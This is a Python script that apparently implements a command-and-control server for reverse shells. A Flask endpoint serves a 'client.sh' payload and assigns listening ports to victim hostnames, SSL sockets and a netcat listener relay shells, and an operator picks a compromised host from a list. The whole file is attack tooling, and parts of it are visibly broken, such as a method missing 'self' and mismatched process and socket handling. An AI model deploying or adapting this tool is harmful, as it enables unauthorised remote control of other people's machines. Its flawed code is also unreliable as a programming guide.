#!/usr/bin/env python3

from subprocess import Popen, PIPE
from colorama import Fore, Style
from flask import Flask, request
from threading import Thread
import socket
import time
import json
import ssl
import os

url='localhost'
ports=list(i for i in range(5000,5010)) 
main_port=8000
connections=dict()
pwners=dict()
app=Flask(__name__)


class Pwner:
    def __init__(self, port, pwnie):
        self.pwnie=pwnie
        self.proc=Popen(['nc','-l',str(port)],stdin=PIPE,stdout=PIPE,stderr=PIPE)
        self.pwnie.at(self.proc)


class Connection:
    def __init__(self, port, hostname):
        self.port=port
        self.hostname=hostname
        self.socket=self.create_socket()

    def create_socket(self, port=None):
        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sslContext = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
        sslContext.load_dh_params("dhparam.pem")
        sslContext.load_cert_chain(certfile='cert.pem', keyfile='cert.pem')
        ssl_sock = sslContext.wrap_socket(sock, server_side=True)
        ssl_sock.bind(('', self.port))
        return ssl_sock

    def at(self, pwner):
        os.dup2(self.socket.fileno(), pwner.stdin)
        os.dup2(self.socket.fileno(), pwner.stdout)
        os.dup2(self.socket.fileno(), pwner.stderr)

    def close():
        self.socket.close()


@app.route('/client')
def serve_client():
    return open('client.sh').read()


@app.route('/port', methods=['POST'])
def port():
    if len(ports) > 0:
        hostname=request.form['hostname']
        port=ports.pop()
        connections[hostname]=Connection(port, hostname)
        return str(port)
    return 'null'


def colorize(s, color):
    return '{}{}{}'.format(Fore.__dict__[color.upper()], s, Style.RESET_ALL)


def get_hosts():
    return list(connections.keys()), '\n'.join(
        '{}: {}'.format(i, hostname)
        for i, hostname in enumerate(connections.keys())
    )+'\n'


def serve_pwner(pwner):
    hostlist,hoststr=get_hosts()
    pwner.send(hoststr.encode())
    selection=connections[hostlist[int(pwner.recv(1024).decode().strip())]]
    pwner.send(str(selection.port).encode())
    pwner.close
    

def main():
    _sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sslContext = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
    sslContext.load_dh_params("dhparam.pem")
    sslContext.load_cert_chain(certfile='cert.pem', keyfile='cert.pem')
    sock = sslContext.wrap_socket(_sock, server_side=True)
    sock.bind(('', main_port))
    sock.listen()

    while True:
        pwner,addr=sock.accept()
        client_t=Thread(target=serve_pwner, args=(pwner,))
        client_t.start()
        

if __name__ == "__main__":
    app_thread=Thread(target=app.run,kwargs={
        'host':'0.0.0.0',
        'port':80
    })
    app_thread.start()
    main()

